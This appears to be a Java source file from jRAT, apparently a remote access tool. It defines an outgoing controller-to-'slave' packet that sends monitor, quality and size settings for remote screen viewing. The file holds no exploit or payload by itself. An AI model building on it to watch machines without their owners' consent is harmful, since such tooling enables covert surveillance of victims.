package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet50UpdateRemoteScreen extends AbstractOutgoingPacket {
	
	private int monitor;
	private int quality;
	private int size;

	public Packet50UpdateRemoteScreen(int monitor, int quality, int size) {
		this.monitor = monitor;
		this.quality = quality;
		this.size = size;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		dos.writeInt(monitor);
		dos.writeInt(quality);
		dos.writeInt(size);
	}

	@Override
	public short getPacketId() {
		return 50;
	}

}
